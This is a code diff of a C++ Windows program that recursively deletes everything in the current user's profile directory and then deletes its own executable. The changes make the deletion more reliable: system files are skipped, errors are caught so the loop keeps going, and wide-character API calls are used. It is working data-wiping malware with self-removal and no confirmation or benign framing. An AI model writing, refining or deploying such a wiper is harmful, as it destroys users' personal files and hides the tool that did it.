@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <Shlobj.h> // For SHGetFolderPath
+#include <Shlobj.h>  // For SHGetFolderPath
 #include <iostream>
 #include <string>
 #include <filesystem>
@@ -8,12 +8,24 @@ namespace fs = std::filesystem;
 
 void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
     for (const auto& entry : fs::directory_iterator(path)) {
-        if (fs::is_directory(entry.status())) {
-            DeleteFilesAndDirs(entry.path(), excludePath);
+        // Skip the file if it's the excluded path
+        if (entry.path() == excludePath) {
+            continue;
         }
 
-        if (entry.path() != excludePath) {
+        // Check for system file attribute
+        DWORD attributes = GetFileAttributes(entry.path().c_str());
+        if (attributes & FILE_ATTRIBUTE_SYSTEM) {
+            // Log and skip system files
+            std::wcout << L"Skipping system file or directory: " << entry.path() << std::endl;
+            continue;
+        }
+
+        try {
             fs::remove_all(entry.path());
+        }
+        catch (const std::filesystem::filesystem_error& e) {
+            std::wcerr << L"Failed to delete: " << entry.path() << L" - " << e.what() << std::endl;
         }
     }
 }
@@ -21,20 +33,20 @@ void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
 int main() {
     // Get the current user profile directory
     wchar_t userProfile[256];
-    SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
+    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
 
     // Get the current executable's path
     wchar_t exePath[MAX_PATH];
-    GetModuleFileName(NULL, exePath, MAX_PATH);
+    GetModuleFileNameW(NULL, exePath, MAX_PATH);
 
     // Convert to filesystem path for easier comparison
     fs::path exeFsPath(exePath);
 
     try {
-        DeleteFilesAndDirs(userProfile, exeFsPath);
+        DeleteFilesAndDirs(fs::path(userProfile), exeFsPath);
     }
     catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
+        std::wcerr << L"Error: " << e.what() << std::endl;
         return 1;
     }
 
@@ -43,7 +55,7 @@ int main() {
         fs::remove(exeFsPath);
     }
     catch (const std::exception& e) {
-        std::cerr << "Error deleting self: " << e.what() << std::endl;
+        std::wcerr << L"Error deleting self: " << e.what() << std::endl;
         return 1;
     }
 
